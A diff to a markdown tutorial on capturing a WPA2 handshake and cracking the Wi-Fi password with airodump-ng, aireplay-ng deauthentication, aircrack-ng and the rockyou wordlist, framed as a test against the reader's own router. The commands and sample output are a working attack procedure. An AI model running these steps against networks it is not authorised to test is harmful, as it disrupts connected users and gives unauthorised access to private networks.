@@ -82,11 +82,13 @@ sudo airodump-ng wlan0mon
 Look for your router's SSID and BSSID. Press Ctrl+C once you see it.
 
 Then:
+airodump-ng to capture packets and listen for the handshake. Terminal 1 (Listening for handshake).This listens for the router on channel 6 and saves any handshakes.
 ```
 sudo airodump-ng --bssid <BSSID> --channel <CH> -w handshake wlan0mon
 ```
-
-Force Handshake via Deauthentication
+Second terminal: Running `aireplay-ng` to deauthenticate a connected device (forcing it to reconnect so you can capture the handshake).
+step Force Handshake via Deauthentication
+This sends deauthentication packets to force a connected client to reconnect — that's when the handshake occurs and gets captured by airodump-ng.
 
 ```
 sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
@@ -99,7 +101,20 @@ Check handshake capture:
 aircrack-ng handshake-01.cap
 ```
 
-Crack the WPA2 Password
+```
+Read 4458 packets.
+
+   #  BSSID              ESSID           Encryption
+   1  8C:90:2D:7D:61:8A  Soul Station    WPA (0 handshake)
+```
+The handshake may not have been fully captured.
+
+A client may not have (re)connected while you were capturing.
+
+The deauthentication may not have worked
+
+
+step Crack the WPA2 Password
 
 ou need a wordlist. Kali has one at /usr/share/wordlists/rockyou.txt.gz:
 ```
